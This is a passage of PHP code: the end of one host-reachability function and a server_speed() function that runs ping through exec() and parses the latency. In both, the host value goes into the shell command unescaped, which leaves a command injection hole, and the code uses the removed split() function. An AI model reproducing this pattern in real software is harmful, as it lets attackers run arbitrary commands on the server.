		//$str = exec("ping -c $numberping -w 1 $ip",$a,$a1);
		$str = exec("ping -c 1 -w 1 $ip",$a,$a1);

		$s = split("/",$str);
		$length = strlen($str);
		if($length > 1) 
		{  
			return 1;
		}
		else 
		{ 
			return 0;
		}
	}
	function server_speed($url)
	{
		$numberping = 1;
		$ip = $url;
		$name = $ip;
		//$str = exec("ping -c $numberping -w 1 $ip",$a,$a1);
		$str = exec("ping -c 1 -w 1 $ip",$a,$a1);

		$s = split("/",$str);
		$length = strlen($str);
		if($length > 1) 
		{  
			return $s[4];
		}
		else 
		{ 
			return 0;
		}
	}

?>